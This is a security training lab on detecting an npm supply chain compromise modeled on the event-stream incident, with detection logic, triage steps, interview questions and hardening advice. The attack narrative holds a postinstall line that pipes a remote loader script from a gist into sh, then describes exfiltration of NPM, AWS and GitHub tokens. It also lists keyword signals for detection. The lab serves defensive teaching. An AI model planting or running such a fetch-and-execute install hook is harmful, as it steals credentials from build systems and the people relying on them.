# Lab 09: Supply Chain (npm)

## Attack Narrative

Build runner installs `event-stream@3.3.6`, which depends on `flatmap-stream@0.1.1`. The transitive dep was first published 1 day ago by a single-maintainer account `hugeglass`. Its postinstall script runs:

```js
require('child_process').exec("curl -sS https://gist.githubusercontent.com/secretpaste/abc/raw/loader.sh | sh")
```

The loader pulls a script from a GitHub gist (an attacker-controlled paste, recently created), executes it, opens an outbound connection to `45.135.232.8:4444`, then reads `NPM_TOKEN`, `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN` from the environment and exfiltrates them.

This pattern follows the actual event-stream/flatmap-stream incident from 2018 (which targeted bitcoin wallet code). Other comparable real incidents: ua-parser-js compromise in 2021, dependency confusion (Birsan, 2021), the colors/faker self-sabotage in 2022.

## Detection Logic

Composite signal across four dimensions.

1. Package metadata: first published less than 30 days ago, single maintainer.
2. Install script content: `child_process.exec`, `curl`, `wget`, http URLs, `eval()`, base64.
3. Network egress during install window to non-registry destinations.
4. Environment variable reads of known secret names by spawned processes.

Any one alone is suspicious. The four together is high-confidence supply chain compromise.

## Run It

```bash
cd labs/lab_09_supply_chain_npm
python3 detect.py install.log
```

## Triage Outcome

Verdict: True Positive, Critical.

Page oncall. Halt all builds. Pull `flatmap-stream` from the dependency tree (`npm uninstall event-stream`, find the working alternative). Rotate ALL secrets that were on the build runner: NPM tokens, AWS keys, GitHub PATs, anything in CI env. Audit anything published from the build runner since the install. Audit any artifact that ran with the affected dependency. Report compromise to npm via security@npmjs.com. Add `flatmap-stream` to org-wide deny list. Hunt for other recently published transitive deps in the dependency graph.

Engineering followup: enforce package allowlist (Renovate, Dependabot, or org-internal mirror). Disable npm install scripts by default in CI (`npm ci --ignore-scripts`). Use a private registry mirror that quarantines new packages.

## Interviewer Questions

- "What is the difference between dependency confusion and typosquatting?" Dependency confusion: attacker publishes a package with the same name as an internal private package, npm resolves to the public one. Typosquatting: attacker publishes `lodash-utils` hoping someone fat-fingers `lodash`. Different attacks, different mitigations.
- "How would you prevent this in CI?" Pinned lockfiles (npm ci enforces). `--ignore-scripts` to skip lifecycle scripts. SBOM generation per build. SLSA-style provenance. Short-lived secrets via OIDC instead of long-lived tokens. Separate build runners per project so blast radius is contained.
- "What about Sigstore and SLSA?" Sigstore signs artifacts, gives you a verifiable chain of custody. SLSA (Supply-chain Levels for Software Artifacts) defines maturity levels for build integrity. Both are protective controls. Detection for unsigned or unverified artifacts becomes possible.
- "How does Snyk or Socket help here?" Snyk and Socket scan packages at install time. Socket in particular flags scripts that touch network, env, file system. Block-on-install for high-risk packages. Useful but not detection: those are preventative.
- "What did the actual event-stream incident exfil?" Bitcoin wallet seed phrases from the bitpay/copay app. The malicious code only activated when running inside a wallet build, masking it from researchers. Targeted supply chain attack, not opportunistic.
- "How does this map to ATT&CK?" T1195.002 (Compromise Software Supply Chain). T1059.007 (JavaScript) for the script execution. T1552.001 (Credentials in Files) and T1552.005 (Cloud Instance Metadata) depending on the env vars stolen.

## Variant: Detection Stack

1. Snyk or Socket at install with policies tuned for production.
2. CI runner with egress allowlist to npm registry, pypi, GitHub releases, and nothing else.
3. Build runner uses short-lived OIDC creds, never long-lived secrets in env.
4. SBOM generated on every build, fed into a vuln scanner that runs continuously (Trivy on the org-wide artifact registry).
5. Sigma rule on the build runner's auditd logs for any process spawned by node that opens a non-registry outbound connection.

This is the fence around the attack. Detection alone is the floor. Hardening the runner is the wall.
